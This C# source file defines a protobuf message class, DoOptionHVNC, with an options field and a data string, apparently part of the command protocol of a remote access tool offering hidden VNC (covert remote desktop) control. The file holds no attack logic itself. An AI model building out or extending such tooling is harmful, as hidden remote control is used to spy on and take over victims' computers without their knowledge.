

using InvokedCommon.Structs;
using ProtoBuf;


namespace InvokedCommon.Messages
{
	[ProtoContract]
	public class DoOptionHVNC : IMessage
	{
		[ProtoMember(1)]
		public HvncOptions options { get; set; }

		[ProtoMember(2)]
		public string data { get; set; }
	}
}
